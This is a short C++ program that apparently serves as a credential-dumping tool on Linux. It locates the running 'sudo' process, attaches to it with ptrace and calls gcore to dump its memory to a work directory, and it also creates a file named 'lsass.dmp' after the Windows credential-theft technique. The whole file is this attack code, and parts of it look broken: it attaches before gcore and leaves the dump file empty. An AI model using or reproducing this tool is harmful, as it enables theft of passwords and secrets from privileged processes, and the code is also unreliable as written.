#include <iostream>
#include <fstream>
#include <sstream>
#include <unistd.h>
#include <sys/types.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <signal.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <dirent.h>
#include <errno.h>

// Function to find process ID by process name
int FindProcessId(const std::string& processName) {
    int processId = 0;

    // Open the /proc directory
    DIR* procDir = opendir("/proc");
    if (!procDir) {
        perror("Failed to open /proc directory");
        return 0;
    }

    // Read entries in /proc directory
    struct dirent* entry;
    while ((entry = readdir(procDir)) != nullptr) {
        if (entry->d_type == DT_DIR) {
            // Check if the entry is a directory (process directory in /proc)
            std::string procPath = "/proc/" + std::string(entry->d_name) + "/comm";
            std::ifstream commFile(procPath.c_str());
            if (commFile) {
                // Read the process name from /proc/<pid>/comm
                std::string comm;
                commFile >> comm;
                // Check if the process name matches
                if (comm == processName) {
                    processId = std::stoi(entry->d_name);
                    break;
                }
            }
        }
    }

    closedir(procDir);
    return processId;
}

// Function to create a core dump using gcore
bool CreateCoreDump(int processId, const std::string& outputPath) {
    std::stringstream command;
    command << "gcore -o " << outputPath << " " << processId;

    // Run gcore command
    int result = system(command.str().c_str());

    // Check the result of the gcore command
    if (WIFEXITED(result) && WEXITSTATUS(result) == 0) {
        std::cout << "Successfully created core dump for process " << processId << std::endl;
        return true;
    } else {
        std::cerr << "Failed to create core dump for process " << processId << std::endl;
        return false;
    }
}

int main() {
    // Specify the process name
    std::string processName = "sudo"; // Change this to the desired process name

    // Find the process ID by name
    int processId = FindProcessId(processName);

    if (processId != 0) {
        // Create the directory if it doesn't exist
        if (mkdir("/home/ubuntu/work", S_IRWXU | S_IRWXG | S_IROTH | S_IXOTH) != 0) {
            if (errno != EEXIST) {
                perror("Failed to create directory");
                return -1;
            }
        }

        std::string dumpFilePath = "/home/ubuntu/work/lsass.dmp";
        std::ofstream dumpFile(dumpFilePath, std::ios::binary);

        // Check if creating the dump file succeeded
        if (!dumpFile.is_open()) {
            std::cerr << "Failed to create dump file." << std::endl;
            return -1;
        }

        // Attach to the process using ptrace
        if (ptrace(PTRACE_ATTACH, processId, nullptr, nullptr) == 0) {
            // Wait for the process to stop
            waitpid(processId, nullptr, 0);

            // Create a core dump
            CreateCoreDump(processId, "/home/ubuntu/work/");

            // Detach from the process
            ptrace(PTRACE_DETACH, processId, nullptr, nullptr);
        } else {
            perror("Failed to attach to the process");
            return -1;
        }
    } else {
        std::cerr << "Process not found: " << processName << std::endl;
        return -1;
    }

    return 0;
}